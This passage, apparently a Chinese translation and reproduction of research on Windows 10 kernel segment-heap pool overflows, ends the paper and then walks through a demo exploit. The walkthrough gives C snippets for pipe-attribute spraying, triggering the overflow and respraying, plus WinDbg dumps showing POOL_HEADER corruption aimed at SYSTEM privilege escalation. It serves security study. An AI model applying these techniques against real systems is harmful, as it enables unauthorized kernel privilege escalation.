### 4.7 讨论漏洞对象的大小
根据易受攻击对象的大小，漏洞利用可能有不同的要求。
上述漏洞利用仅适用于最小大小为 0x130 的漏洞块。这是因为幽灵块的大小必须至少为0x210。
对于大小低于 0x130 的漏洞块，幽灵块的分配将覆盖被覆盖块后面的块，并在释放时触发崩溃。这是可修复的，但是留给读者自己去练习吧。
在LFH的漏洞对象（小于0x200的块）和VS段的漏洞对象（大于0x200）之间有一些不同。主要的是，在VS块的前面有额外的头。它意味着能够控制VS
segment 的下一个块的POOL_HEADER，至少需要堆溢出0x14个字节。这也意味着当覆盖的块将被释放时，它的
_HEAP_VS_CHUNK_HEADER
必须已修复。另外，要注意的是不能释放覆盖的块之后2个喷射了合适大小的块，因为VS的释放机制也许会读覆盖的块的头部企图合并3个空闲块。
最后，LFH和VS中的堆处理是相当不同的，正如4.4节中讲到的。
## 5 结论
这篇文章描述了自Windows 10
19H1以来池内部的一个状态。段堆被引入内核且不需要元数据来正常工作。然后，旧的POOL_HEADER依旧存在于每个块的头部，但用法不同。
我们演示了一些在内核中使用堆溢出的攻击，通过攻击特定池的内部。
演示的EXP可以适应任意可以提供最小堆溢出的漏洞，就可以实现从低完整性到SYSTEM完整性的本地权限提升。
## 6 引用
  1. Corentin Bayet. Exploit of CVE-2017-6008 with Quota Process Pointer Overwrite attack. https://github.com/cbayet/Exploit-CVE-2017-6008/blob/master/Windows10PoolParty.pdf, 2017.
  2. Corentin Bayet and Paul Fariello. PoC exploiting Aligned Chunk Confusion on Windows kernel Segment Heap. https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion, 2020.
  3. Cesar Cerrudo. Tricks to easily elevate its privileges. https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf, 2012.
  4. Matt Conover and w00w00 Security Development. w00w00 on Heap Overflows. http://www.w00w00.org/files/articles/heaptut.txt, 1999.
  5. Tarjei Mandt. Kernel Pool Exploitation on Windows 7. Blackhat DC, 2011.
  6. Haroon Meer. Memory Corruption Attacks The (almost) Complete History. BlackhatUSA, 2010.
  7. Mark Vincent Yason. Windows 10 Segment Heap Internals. Blackhat US, 2016.
## 7 复现
原作者在写这边文章的同时，提供了一个demo用演示上述文章内提到的利用技术，这里我们来复现这个demo。
demo总共分为两部分，分别为漏洞驱动程序和EXP。漏洞驱动使用Visual Studio编译，EXP需要使用GCC编译。
demo本身实现了两种后端分配器（LFH和VS）的利用，但是在上述文章中是以LFH来进行讲解，所以我们复现也以LFH后端进行复现。
这里我们按照EXP的执行流程进行分析，关于EXP中如何创建管道，如何构造Pipe_Attribute等内容，都很好理解，自行阅读源码即可，就不浪费时间分析了，这里主要复现和分析漏洞利用的关键过程。
## 1\. 申请漏洞块
使用已经构造好的pipe_attribute来给管道设置属性，实现可以预测的漏洞块的申请。
    spray_pipes(spray1);
    uintptr_t vuln = alloc_vuln(xploit);
    printf("Vulnerable allocation is at 0x%016llX", vuln);
    spray_pipes(spray2);
    //spray1和spray2是构造好的pipe_attribute属性
申请的漏洞块如下所示
     0: kd> !pool 0xFFFFB80008CFB3F0
    Pool page ffffb80008cfb3f0 region is Paged pool
     ffffb80008cfb0c0 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfb250 size:  190 previous size:    0  (Allocated)  NpAt
    *ffffb80008cfb3e0 size:  190 previous size:    0  (Allocated) *VULN //这里就是申请的漏洞块
            Owning component : Unknown (update pooltag.txt)
     ffffb80008cfb570 size:  190 previous size:    0  (Allocated)  NpAt //与漏洞块相邻的是即将被漏洞块溢出后所覆盖的块，之后我们称之为相邻块
     ffffb80008cfb700 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfb890 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfba20 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfbbb0 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfbd40 size:  190 previous size:    0  (Allocated)  NpAt
触发漏洞前，漏洞块和相邻块的原始值
    0: kd> dq ffffb80008cfb3e0
    ffffb800`08cfb3e0  4e4c5556`03190000 ffffffff`ffffffff
    ffffb800`08cfb3f0  00009d70`0000000a ffffffff`00000168
    ffffb800`08cfb400  00000000`00000000 00000056`0000003a
    ffffb800`08cfb410  0000000a`00000000 7865646e`49707041
    ffffb800`08cfb420  00000000`00007265 000f6b76`ffffffd8
    ffffb800`08cfb430  00009670`0000001e 00000001`05f5e10c
    ffffb800`08cfb440  4c646578`65646e49 00656761`75676e61
    ffffb800`08cfb450  72c66400`fffffff0 00000101`d7ac7dbd
    0: kd> dt nt!_POOL_HEADER ffffb80008cfb3e0
       +0x000 PreviousSize     : 0y00000000 (0)
       +0x000 PoolIndex        : 0y00000000 (0)
       +0x002 BlockSize        : 0y00011001 (0x19)
       +0x002 PoolType         : 0y00000011 (0x3)
       +0x000 Ulong1           : 0x3190000
       +0x004 PoolTag          : 0x4e4c5556
       +0x008 ProcessBilled    : 0xffffffff`ffffffff _EPROCESS
       +0x008 AllocatorBackTraceIndex : 0xffff
       +0x00a PoolTagHash      : 0xffff
    0: kd> dq ffffb80008cfb570
    ffffb800`08cfb570  7441704e`03196900 00000000`ffffffe8 //触发漏洞后，相邻块的POOL_HEADER会被修改
    ffffb800`08cfb580  ffffb800`09069850 ffffb800`09069850
    ffffb800`08cfb590  ffffb800`08cfb5a8 00000000`00000156
    ffffb800`08cfb5a0  ffffb800`08cfb5aa 41414141`4141005a
    ffffb800`08cfb5b0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5c0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5d0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5e0  41414141`41414141 41414141`41414141
    0: kd> dt nt!_POOL_HEADER ffffb80008cfb570
       +0x000 PreviousSize     : 0y00000000 (0)
       +0x000 PoolIndex        : 0y01101001 (0x69)
       +0x002 BlockSize        : 0y00011001 (0x19)
       +0x002 PoolType         : 0y00000011 (0x3)
       +0x000 Ulong1           : 0x3196900
       +0x004 PoolTag          : 0x7441704e
       +0x008 ProcessBilled    : 0x00000000`ffffffe8 _EPROCESS
       +0x008 AllocatorBackTraceIndex : 0xffe8
       +0x00a PoolTagHash      : 0xffff
## 2\. 触发漏洞
对漏洞块执行复制操作，使其发生溢出，修改相邻块的POOL_HEADER，接着释放漏洞块，同时使用respray再次占用漏洞块。使用respray再次占用漏洞块的目的是为了给幽灵块构造一个POOL_HEADER。
    trigger_vuln(xploit, overflow, xploit->offset_to_pool_header + 4);
    free_vuln();
    spray_pipes(xploit->respray);
触发漏洞后，相邻块的POOL_HEADER如下
    0: kd> !pool 0xFFFFB80008CFB3F0
    Pool page ffffb80008cfb3f0 region is Paged pool
     ffffb80008cfb0c0 size:  190 previous size:    0  (Allocated)  NpAt
     ffffb80008cfb250 size:  190 previous size:    0  (Allocated)  NpAt
    *ffffb80008cfb3e0 size:  190 previous size:    0  (Allocated) *NpAt
            Owning component : Unknown (update pooltag.txt)
    //因为我们已经通过溢出修改了相邻块的POOL_HEADER,所以系统认为当前的相邻块不是有效的池分配。
    ffffb80008cfb570 doesn't look like a valid small pool allocation, checking to see
    if the entire page is actually part of a large page allocation...
    ffffb80008cfb570 is not a valid large pool allocation, checking large session pool...
    Unable to read large session pool table (Session data is not present in mini and kernel-only dumps)
    ffffb80008cfb570 is not valid pool. Checking for freed (or corrupt) pool
    Bad allocation size @ffffb80008cfb570, zero is invalid
    ***
    *** An error (or corruption) in the pool was detected;
    *** Attempting to diagnose the problem.
    ***
    *** Use !poolval ffffb80008cfb000 for more details.
    Pool page [ ffffb80008cfb000 ] is INVALID.
    Analyzing linked list...
    Scanning for single bit errors...
    None found
    0: kd> dq ffffb80008cfb3e0 //这里是被respray再次占用的漏洞块
    ffffb800`08cfb3e0  7441704e`03190000 ffffffff`ffffffff
    ffffb800`08cfb3f0  ffffb800`09109830 ffffb800`09109830
    ffffb800`08cfb400  ffffb800`08cfb418 00000000`00000156
    ffffb800`08cfb410  ffffb800`08cfb41a 42424242`4242005a
    ffffb800`08cfb420  ffffffaf`00210000 42424242`42424242 //respray对原始的pipe_attribute值进行了修改，这里被赋值为幽灵块的POOL_HADER
    ffffb800`08cfb430  42424242`42424242 42424242`42424242
    ffffb800`08cfb440  42424242`42424242 42424242`42424242
    ffffb800`08cfb450  42424242`42424242 42424242`42424242
    0: kd> dt nt!_POOL_HEADER ffffb800`08cfb420
       +0x000 PreviousSize     : 0y00000000 (0)
       +0x000 PoolIndex        : 0y00000000 (0)
       +0x002 BlockSize        : 0y00100001 (0x21) //幽灵块的大小 0x210/0x10
       +0x002 PoolType         : 0y00000000 (0)
       +0x000 Ulong1           : 0x210000
       +0x004 PoolTag          : 0xffffffaf
       +0x008 ProcessBilled    : 0x42424242`42424242 _EPROCESS
       +0x008 AllocatorBackTraceIndex : 0x4242
       +0x00a PoolTagHash      : 0x4242
    0: kd> dq ffffb80008cfb570
    ffffb800`08cfb570  7441704e`04000015 00000000`ffffffe8 //可以看到，相邻块的POOL_HEADER已被修改
    ffffb800`08cfb580  ffffb800`09069850 ffffb800`09069850
    ffffb800`08cfb590  ffffb800`08cfb5a8 00000000`00000156
    ffffb800`08cfb5a0  ffffb800`08cfb5aa 41414141`4141005a
    ffffb800`08cfb5b0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5c0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5d0  41414141`41414141 41414141`41414141
    ffffb800`08cfb5e0  41414141`41414141 41414141`41414141
    0: kd> dt nt!_POOL_HEADER dq ffffb80008cfb570
    Cannot find specified field members.
    0: kd> dt nt!_POOL_HEADER ffffb80008cfb570
       +0x000 PreviousSize     : 0y00010101 (0x15)
       +0x000 PoolIndex        : 0y00000000 (0)
       +0x002 BlockSize        : 0y00000000 (0)
       +0x002 PoolType         : 0y00000100 (0x4)
       +0x000 Ulong1           : 0x4000015
       +0x004 PoolTag          : 0x7441704e
       +0x008 ProcessBilled    : 0x00000000`ffffffe8 _EPROCESS